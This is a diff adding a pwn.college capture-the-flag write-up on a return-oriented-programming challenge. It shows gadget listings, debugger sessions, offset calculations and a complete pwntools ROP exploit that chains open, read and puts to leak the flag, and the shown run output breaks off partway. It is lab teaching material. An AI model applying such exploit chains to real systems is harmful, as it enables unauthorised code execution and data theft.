@@ -3520,3 +3520,586 @@ $
 hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ cat /flag 
 pwn.college{0dY0MtDlT_gkfSSrek3AId3RaXP.0FM1MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Indirect Invocation (Easy)
+
+```
+hacker@return-oriented-programming~indirect-invocation-easy:~$ /challenge/indirect-invocation-easy 
+###
+### Welcome to /challenge/indirect-invocation-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+```
+
+This time there is no `syscall` gadget. 
+
+### Binary Analysis
+
+Let's look at what gadgets are there.
+
+```
+hacker@return-oriented-programming~indirect-invocation-easy:/$ ROPgadget --binary /challenge/indirect-invocation-easy 
+Gadgets information
+============================================================
+0x00000000004016c7 : adc eax, 0xc9fffffb ; ret
+0x000000000040121d : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040124b : add bh, bh ; loopne 0x4012b5 ; nop ; ret
+0x00000000004022f5 : add byte ptr [rax + 0x29], cl ; ret 0x8948
+0x0000000000402345 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
+0x00000000004015af : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
+0x0000000000402299 : add byte ptr [rax - 0x39], cl ; loopne 0x4022fe ; ret
+0x0000000000401544 : add byte ptr [rax - 0x77], cl ; iretd
+0x0000000000401542 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
+0x0000000000401332 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
+0x00000000004024ec : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x0000000000401334 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
+0x00000000004015b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
+0x000000000040167f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
+0x00000000004016fd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
+0x0000000000402478 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x0000000000402479 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x00000000004012ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004024ee : add byte ptr [rax], al ; endbr64 ; ret
+0x000000000040121c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000401336 : add byte ptr [rax], al ; jmp 0x4014b0
+0x00000000004015b6 : add byte ptr [rax], al ; jmp 0x401648
+0x0000000000401681 : add byte ptr [rax], al ; jmp 0x4016af
+0x00000000004016ff : add byte ptr [rax], al ; jmp 0x401726
+0x000000000040247a : add byte ptr [rax], al ; leave ; ret
+0x00000000004022a0 : add byte ptr [rax], al ; nop ; pop rbp ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x00000000004012bb : add byte ptr [rcx], al ; pop rbp ; ret
+0x000000000040247b : add cl, cl ; ret
+0x000000000040124a : add dil, dil ; loopne 0x4012b5 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x00000000004012bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040132f : add eax, 0x3d88 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
+0x00000000004012b7 : add eax, 0x3dfb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
+0x0000000000402352 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x0000000000402276 : call qword ptr [rax + 0xff3c35d]
+0x0000000000401737 : call qword ptr [rax + 0xff3c3c9]
+0x00000000004014cc : call qword ptr [rax - 0x179a72b8]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x00000000004015b3 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
+0x0000000000402285 : clc ; pop rcx ; ret
+0x00000000004016fc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
+0x00000000004012d3 : cli ; jmp 0x401260
+0x0000000000401223 : cli ; ret
+0x00000000004022f2 : cli ; sub eax, 0x29480000 ; ret 0x8948
+0x00000000004024fb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401331 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x4014b0
+0x00000000004012b9 : cmp eax, 0x5d010000 ; ret
+0x000000000040121b : cmp eax, 0x90f40000 ; endbr64 ; ret
+0x0000000000401248 : cwde ; push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
+0x00000000004016ca : dec ecx ; ret
+0x00000000004012d0 : endbr64 ; jmp 0x401260
+0x0000000000401220 : endbr64 ; ret
+0x00000000004024cc : fisttp word ptr [rax - 0x7d] ; ret
+0x000000000040167e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
+0x000000000040121e : hlt ; nop ; endbr64 ; ret
+0x00000000004024aa : in al, dx ; or al, ch ; jmp 0x4024af
+0x00000000004016f9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
+0x000000000040167b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
+0x0000000000401547 : iretd
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401245 : je 0x401250 ; mov edi, 0x405098 ; jmp rax
+0x0000000000401287 : je 0x401290 ; mov edi, 0x405098 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004012d4 : jmp 0x401260
+0x0000000000401338 : jmp 0x4014b0
+0x00000000004015b8 : jmp 0x401648
+0x0000000000401683 : jmp 0x4016af
+0x0000000000401669 : jmp 0x4016b5
+0x000000000040150f : jmp 0x4016cb
+0x0000000000401701 : jmp 0x401726
+0x00000000004024ae : jmp 0x4024af
+0x000000000040100b : jmp 0x4840104f
+0x000000000040124c : jmp rax
+0x00000000004014cf : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+0x00000000004016cb : leave ; ret
+0x000000000040124d : loopne 0x4012b5 ; nop ; ret
+0x000000000040229d : loopne 0x4022fe ; ret
+0x00000000004012b6 : mov byte ptr [rip + 0x3dfb], 1 ; pop rbp ; ret
+0x0000000000401330 : mov byte ptr [rip], bh ; add byte ptr [rax], al ; jmp 0x4014b0
+0x000000000040229b : mov dword ptr [rbp - 0x20], 0xc35f ; nop ; pop rbp ; ret
+0x000000000040167c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x4016af
+0x00000000004016fa : mov dword ptr [rbp - 4], 0 ; jmp 0x401726
+0x00000000004015b1 : mov dword ptr [rbp - 8], 0 ; jmp 0x401648
+0x0000000000402477 : mov eax, 0 ; leave ; ret
+0x0000000000401247 : mov edi, 0x405098 ; jmp rax
+0x00000000004015b0 : mov qword ptr [rbp - 8], 0 ; jmp 0x401648
+0x0000000000402342 : movabs byte ptr [0x8948d1294800002d], al ; retf 0x148
+0x000000000040121f : nop ; endbr64 ; ret
+0x0000000000401738 : nop ; leave ; ret
+0x0000000000402251 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402252 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402253 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402254 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402255 : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402256 : nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402257 : nop ; nop ; pop rbp ; ret
+0x0000000000402258 : nop ; pop rbp ; ret
+0x000000000040124f : nop ; ret
+0x00000000004012cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401260
+0x00000000004024ab : or al, ch ; jmp 0x4024af
+0x0000000000401246 : or dword ptr [rdi + 0x405098], edi ; jmp rax
+0x0000000000401105 : or eax, 0xf2000000 ; jmp 0x401020
+0x00000000004024dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014d3 : pop r12 ; pop r13 ; pop rbp ; ret
+0x00000000004024de : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014d5 : pop r13 ; pop rbp ; ret
+0x00000000004024e0 : pop r14 ; pop r15 ; ret
+0x00000000004024e2 : pop r15 ; ret
+0x00000000004024db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004024df : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004014d6 : pop rbp ; pop rbp ; ret
+0x00000000004012bd : pop rbp ; ret
+0x00000000004014d2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+0x0000000000402286 : pop rcx ; ret
+0x000000000040229e : pop rdi ; ret
+0x000000000040228e : pop rdx ; ret
+0x00000000004024e1 : pop rsi ; pop r15 ; ret
+0x0000000000402296 : pop rsi ; ret
+0x00000000004024dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014d4 : pop rsp ; pop r13 ; pop rbp ; ret
+0x0000000000401249 : push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
+0x0000000000402390 : push rsp ; sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
+0x000000000040101a : ret
+0x000000000040153f : ret 0x40be
+0x0000000000402355 : ret 0x458b
+0x00000000004022f8 : ret 0x8948
+0x00000000004023a5 : ret 0x8b48
+0x00000000004014ef : ret 0x8be
+0x0000000000402319 : retf
+0x000000000040234b : retf 0x148
+0x00000000004023a2 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
+0x0000000000402348 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x00000000004012b8 : sti ; cmp eax, 0x5d010000 ; ret
+0x00000000004022f3 : sub eax, 0x29480000 ; ret 0x8948
+0x0000000000402343 : sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
+0x00000000004024fd : sub esp, 8 ; add rsp, 8 ; ret
+0x00000000004024fc : sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401243 : test eax, eax ; je 0x401250 ; mov edi, 0x405098 ; jmp rax
+0x0000000000401285 : test eax, eax ; je 0x401290 ; mov edi, 0x405098 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 149
+```
+
+We still have the classic `pop` gadgets which set the values of registers. So we can still set up a syscall.
+
+As for the invocation of the syscall, even if we cannot directly do it, we can leverage the PLT stubs which are present in the binary.
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401110  putchar@plt
+0x0000000000401120  __errno_location@plt
+0x0000000000401130  puts@plt
+0x0000000000401140  cs_free@plt
+0x0000000000401150  printf@plt
+0x0000000000401160  read@plt
+0x0000000000401170  strcmp@plt
+0x0000000000401180  cs_disasm@plt
+0x0000000000401190  mincore@plt
+0x00000000004011a0  sendfile@plt
+0x00000000004011b0  setvbuf@plt
+0x00000000004011c0  cs_open@plt
+0x00000000004011d0  open@plt
+0x00000000004011e0  cs_close@plt
+0x00000000004011f0  _start
+0x0000000000401220  _dl_relocate_static_pie
+0x0000000000401230  deregister_tm_clones
+0x0000000000401260  register_tm_clones
+0x00000000004012a0  __do_global_dtors_aux
+0x00000000004012d0  frame_dummy
+0x00000000004012d6  DUMP_STACK
+0x00000000004014d9  print_gadget
+0x00000000004016cd  print_chain
+0x000000000040173b  bin_padding
+0x000000000040225b  force_import
+0x000000000040227a  free_gadgets
+0x00000000004022a5  challenge
+0x00000000004023c6  main
+0x0000000000402480  __libc_csu_init
+0x00000000004024f0  __libc_csu_fini
+0x00000000004024f8  _fini
+```
+
+We can use the `open@plt`, `read@plt` and `puts@plt`.
+
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Buffer address: `0x7ffcd4fe1ae0`
+   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+- [ ] Location of a NULL terminated string
+- [x] Locations of required PLT stubs.
+   - `open@plt`: `0x4011d0`
+   - `read@plt`: `0x401160`
+   - `puts@plt`: `0x401130`
+- [ ] Location to read the flag to
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000004022a5 <+0>:     endbr64
+   0x00000000004022a9 <+4>:     push   rbp
+   0x00000000004022aa <+5>:     mov    rbp,rsp
+   0x00000000004022ad <+8>:     sub    rsp,0x70
+   0x00000000004022b1 <+12>:    mov    DWORD PTR [rbp-0x54],edi
+   0x00000000004022b4 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x00000000004022b8 <+19>:    mov    QWORD PTR [rbp-0x68],rdx
+   0x00000000004022bc <+23>:    lea    rdi,[rip+0xed5]        # 0x403198
+   0x00000000004022c3 <+30>:    call   0x401130 <puts@plt>
+   0x00000000004022c8 <+35>:    lea    rdi,[rip+0xf41]        # 0x403210
+   0x00000000004022cf <+42>:    call   0x401130 <puts@plt>
+   0x00000000004022d4 <+47>:    mov    rax,rsp
+   0x00000000004022d7 <+50>:    mov    QWORD PTR [rip+0x2e12],rax        # 0x4050f0 <sp_>
+   0x00000000004022de <+57>:    mov    rax,rbp
+   0x00000000004022e1 <+60>:    mov    QWORD PTR [rip+0x2de8],rax        # 0x4050d0 <bp_>
+   0x00000000004022e8 <+67>:    mov    rdx,QWORD PTR [rip+0x2de1]        # 0x4050d0 <bp_>
+   0x00000000004022ef <+74>:    mov    rax,QWORD PTR [rip+0x2dfa]        # 0x4050f0 <sp_>
+   0x00000000004022f6 <+81>:    sub    rdx,rax
+   0x00000000004022f9 <+84>:    mov    rax,rdx
+   0x00000000004022fc <+87>:    shr    rax,0x3
+   0x0000000000402300 <+91>:    add    rax,0x2
+   0x0000000000402304 <+95>:    mov    QWORD PTR [rip+0x2dd5],rax        # 0x4050e0 <sz_>
+   0x000000000040230b <+102>:   mov    rax,QWORD PTR [rip+0x2dbe]        # 0x4050d0 <bp_>
+   0x0000000000402312 <+109>:   add    rax,0x8
+   0x0000000000402316 <+113>:   mov    QWORD PTR [rip+0x2dcb],rax        # 0x4050e8 <rp_>
+   0x000000000040231d <+120>:   lea    rax,[rbp-0x50]
+   0x0000000000402321 <+124>:   mov    edx,0x1000
+   0x0000000000402326 <+129>:   mov    rsi,rax
+   0x0000000000402329 <+132>:   mov    edi,0x0
+   0x000000000040232e <+137>:   call   0x401160 <read@plt>
+   0x0000000000402333 <+142>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000402336 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000402339 <+148>:   cdqe
+   0x000000000040233b <+150>:   lea    rcx,[rbp-0x50]
+   0x000000000040233f <+154>:   mov    rdx,QWORD PTR [rip+0x2da2]        # 0x4050e8 <rp_>
+   0x0000000000402346 <+161>:   sub    rcx,rdx
+   0x0000000000402349 <+164>:   mov    rdx,rcx
+   0x000000000040234c <+167>:   add    rax,rdx
+   0x000000000040234f <+170>:   shr    rax,0x3
+   0x0000000000402353 <+174>:   mov    rdx,rax
+   0x0000000000402356 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000402359 <+180>:   mov    esi,eax
+   0x000000000040235b <+182>:   lea    rdi,[rip+0xf16]        # 0x403278
+   0x0000000000402362 <+189>:   mov    eax,0x0
+   0x0000000000402367 <+194>:   call   0x401150 <printf@plt>
+   0x000000000040236c <+199>:   lea    rdi,[rip+0xf3d]        # 0x4032b0
+   0x0000000000402373 <+206>:   call   0x401130 <puts@plt>
+   0x0000000000402378 <+211>:   lea    rdi,[rip+0xf99]        # 0x403318
+   0x000000000040237f <+218>:   call   0x401130 <puts@plt>
+   0x0000000000402384 <+223>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000402387 <+226>:   cdqe
+   0x0000000000402389 <+228>:   lea    rcx,[rbp-0x50]
+   0x000000000040238d <+232>:   mov    rdx,QWORD PTR [rip+0x2d54]        # 0x4050e8 <rp_>
+   0x0000000000402394 <+239>:   sub    rcx,rdx
+   0x0000000000402397 <+242>:   mov    rdx,rcx
+   0x000000000040239a <+245>:   add    rax,rdx
+   0x000000000040239d <+248>:   shr    rax,0x3
+   0x00000000004023a1 <+252>:   add    eax,0x1
+   0x00000000004023a4 <+255>:   mov    edx,eax
+   0x00000000004023a6 <+257>:   mov    rax,QWORD PTR [rip+0x2d3b]        # 0x4050e8 <rp_>
+   0x00000000004023ad <+264>:   mov    esi,edx
+   0x00000000004023af <+266>:   mov    rdi,rax
+   0x00000000004023b2 <+269>:   call   0x4016cd <print_chain>
+   0x00000000004023b7 <+274>:   lea    rdi,[rip+0xf9c]        # 0x40335a
+   0x00000000004023be <+281>:   call   0x401130 <puts@plt>
+   0x00000000004023c3 <+286>:   nop
+   0x00000000004023c4 <+287>:   leave
+   0x00000000004023c5 <+288>:   ret
+End of assembler dump.
+```
+
+We can set a breakpoint at `challenge+137` and run.
+
+```
+pwndbg> break *(challenge+137)
+Breakpoint 1 at 0x40232e
+```
+
+```
+pwndbg> run
+Starting program: /challenge/indirect-invocation-easy 
+###
+### Welcome to /challenge/indirect-invocation-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+
+Breakpoint 1, 0x000000000040232e in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
+ RAX  0x7ffcd4fe1ae0 ◂— 0
+ RBX  0x402480 (__libc_csu_init) ◂— endbr64 
+ RCX  0x71c72cf3b297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffcd4fe1ae0 ◂— 0
+ R8   0x61
+ R9   0x34
+ R10  0x4005ec ◂— 0x72616863747570 /* 'putchar' */
+ R11  0x246
+ R12  0x4011f0 (_start) ◂— endbr64 
+ R13  0x7ffcd4fe1c50 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffcd4fe1b30 —▸ 0x7ffcd4fe1b60 ◂— 0
+ RSP  0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+ RIP  0x40232e (challenge+137) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
+ ► 0x40232e <challenge+137>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/2)
+        buf: 0x7ffcd4fe1ae0 ◂— 0
+        nbytes: 0x1000
+ 
+   0x402333 <challenge+142>    mov    dword ptr [rbp - 4], eax
+   0x402336 <challenge+145>    mov    eax, dword ptr [rbp - 4]
+   0x402339 <challenge+148>    cdqe   
+   0x40233b <challenge+150>    lea    rcx, [rbp - 0x50]
+   0x40233f <challenge+154>    mov    rdx, qword ptr [rip + 0x2da2]     RDX, [rp_]
+   0x402346 <challenge+161>    sub    rcx, rdx
+   0x402349 <challenge+164>    mov    rdx, rcx
+   0x40234c <challenge+167>    add    rax, rdx
+   0x40234f <challenge+170>    shr    rax, 3
+   0x402353 <challenge+174>    mov    rdx, rax
+─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+01:0008│-068     0x7ffcd4fe1ac8 —▸ 0x7ffcd4fe1c68 —▸ 0x7ffcd4fe2681 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-060     0x7ffcd4fe1ad0 —▸ 0x7ffcd4fe1c58 —▸ 0x7ffcd4fe265d ◂— '/challenge/indirect-invocation-easy'
+03:0018│-058     0x7ffcd4fe1ad8 ◂— 0x100000000
+04:0020│ rax rsi 0x7ffcd4fe1ae0 ◂— 0
+05:0028│-048     0x7ffcd4fe1ae8 —▸ 0x71c72cebde93 (_IO_file_overflow+275) ◂— cmp eax, -1
+06:0030│-040     0x7ffcd4fe1af0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-038     0x7ffcd4fe1af8 ◂— 0xa /* '\n' */
+───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x40232e challenge+137
+   1         0x40246b main+165
+   2   0x71c72ce51083 __libc_start_main+243
+   3         0x40121e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Lets get the address of te stored return pointer.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffcd4fe1b40:
+ rip = 0x40232e in challenge; saved rip = 0x40246b
+ called by frame at 0x7ffcd4fe1b70
+ Arglist at 0x7ffcd4fe1b30, args: 
+ Locals at 0x7ffcd4fe1b30, Previous frame's sp is 0x7ffcd4fe1b40
+ Saved registers:
+  rbp at 0x7ffcd4fe1b30, rip at 0x7ffcd4fe1b38
+```
+
+Now we can calculate the offset.
+
+```
+pwndbg> p/d 0x7ffcd4fe1b38 - 0x7ffcd4fe1ae0
+$1 = 88
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Buffer address: `0x7ffcd4fe1ae0`
+   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+- [ ] Location of a NULL terminated string
+- [x] Locations of required PLT stubs.
+   - `open@plt`: `0x4011d0`
+   - `read@plt`: `0x401160`
+   - `puts@plt`: `0x401130`
+- [ ] Location to read the flag to
+
+Let's find a string we can use a symlink.
+
+```
+hacker@return-oriented-programming~indirect-invocation-easy:/$ objdump -s -j .rodata /challenge/indirect-invocation-easy | grep -E "[0-9a-f]{2}00"
+ 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
+ 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
+ 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
+ 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
+ 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
+ 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
+ 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
+ 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
+ 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
+ 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
+ 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
+ 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
+ 403200 20746869 73207365 72696573 206f6600   this series of.
+ 403270 00000000 00000000 52656365 69766564  ........Received
+ 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
+ 403300 67657473 20617265 20657865 63757461  gets are executa
+ 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
+ 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
+ 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
+ 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
+ 403380 6f6f6462 79652100                    oodbye!.
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Buffer address: `0x7ffcd4fe1ae0`
+   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+- [x] Location of a NULL terminated string: `0x403386`
+- [x] Locations of required PLT stubs.
+   - `open@plt`: `0x4011d0`
+   - `read@plt`: `0x401160`
+   - `puts@plt`: `0x401130`
+- [ ] Location to read the flag to
+
+Let's get the address of the `.bss` section.
+
+```
+pwndbg> info files
+Symbols from "/challenge/indirect-invocation-easy".
+Local exec file:
+        `/challenge/indirect-invocation-easy', file type elf64-x86-64.
+        Entry point: 0x4011f0
+        0x0000000000400318 - 0x0000000000400334 is .interp
+        0x0000000000400338 - 0x0000000000400358 is .note.gnu.property
+        0x0000000000400358 - 0x000000000040037c is .note.gnu.build-id
+        0x000000000040037c - 0x000000000040039c is .note.ABI-tag
+        0x00000000004003a0 - 0x00000000004003c8 is .gnu.hash
+        0x00000000004003c8 - 0x0000000000400590 is .dynsym
+        0x0000000000400590 - 0x0000000000400653 is .dynstr
+        0x0000000000400654 - 0x000000000040067a is .gnu.version
+        0x0000000000400680 - 0x00000000004006a0 is .gnu.version_r
+        0x00000000004006a0 - 0x0000000000400700 is .rela.dyn
+        0x0000000000400700 - 0x0000000000400850 is .rela.plt
+        0x0000000000401000 - 0x000000000040101b is .init
+        0x0000000000401020 - 0x0000000000401110 is .plt
+        0x0000000000401110 - 0x00000000004011f0 is .plt.sec
+        0x00000000004011f0 - 0x00000000004024f5 is .text
+        0x00000000004024f8 - 0x0000000000402505 is .fini
+        0x0000000000403000 - 0x0000000000403388 is .rodata
+        0x0000000000403388 - 0x0000000000403404 is .eh_frame_hdr
+        0x0000000000403408 - 0x00000000004035f0 is .eh_frame
+        0x0000000000404e00 - 0x0000000000404e08 is .init_array
+        0x0000000000404e08 - 0x0000000000404e10 is .fini_array
+        0x0000000000404e10 - 0x0000000000404ff0 is .dynamic
+        0x0000000000404ff0 - 0x0000000000405000 is .got
+        0x0000000000405000 - 0x0000000000405088 is .got.plt
+        0x0000000000405088 - 0x0000000000405098 is .data
+        0x00000000004050a0 - 0x00000000004050f8 is .bss
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Buffer address: `0x7ffcd4fe1ae0`
+   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+- [x] Location of a NULL terminated string: `0x403386`
+- [x] Locations of required PLT stubs.
+   - `open@plt`: `0x4011d0`
+   - `read@plt`: `0x401160`
+   - `puts@plt`: `0x401130`
+- [ ] Location to read the flag to: `0x4050a0`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Ensure 8-byte packing for 64-bit addresses
+context.arch = 'amd64'
+
+# Gadgets
+pop_rdi = 0x40229e
+pop_rsi = 0x402296
+pop_rdx = 0x40228e
+
+# PLT Entries
+open_plt = 0x4011d0
+read_plt = 0x401160
+puts_plt = 0x401130
+
+# Memory Addresses
+bang_addr = 0x403386     
+writable_buff = 0x405100 
+offset = 88
+
+p = process('/challenge/indirect-invocation-easy')
+
+# ROP chain using regular flat() list
+payload = flat(
+    b"A" * offset,
+
+    # open("!", O_RDONLY)
+    pop_rdi, bang_addr,
+    pop_rsi, 0,
+    open_plt,
+    
+    # read(3, writable_buff, 100)
+    pop_rdi, 3,
+    pop_rsi, writable_buff,
+    pop_rdx, 100,
+    read_plt,
+    
+    # puts(writable_buff)
+    pop_rdi, writable_buff,
+    puts_plt
+)
+
+p.sendline(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~indirect-invocation-easy:~$ python ~/script.py
+[+] Starting local process '/challenge/indirect-invocation-easy': pid 2281
+[*] Switching to interactive mode
+###
+### Welcome to /challenge/indirect-invocation-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+Received 209 bytes! This is potentially 15 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 16 gadgets of ROP chain at 0x7ffc1158a9d8.
+| 0x000000000040229e: pop rdi ; ret  ; 
+| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; jl 0x40338e ; add byte ptr [rax], al ; 
+| 0x0000000000402296: pop rsi ; ret  ; 
+| 0x0000000000000000: (UNMAPPED MEMORY)
+| 0x00000000004011d0: endbr64  ; bnd jmp qword ptr [rip + 0x3e9d] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3e95] ; nop dword ptr [rax + rax] ; endbr64  ; xor ebp, ebp ; mov r9, rdx ; pop rsi ; mov rdx, rsp ; and rsp, 0xfffffffffffffff0 ; push rax ; push rsp ; mov r8, 0x4024f0 ; 
+| 0x000000000040229e: pop rdi ; ret  ; 
+| 0x0000000000000003: (UNMAPPED MEMORY)
+| 0x0000000000402296: pop rsi ; ret  ; 
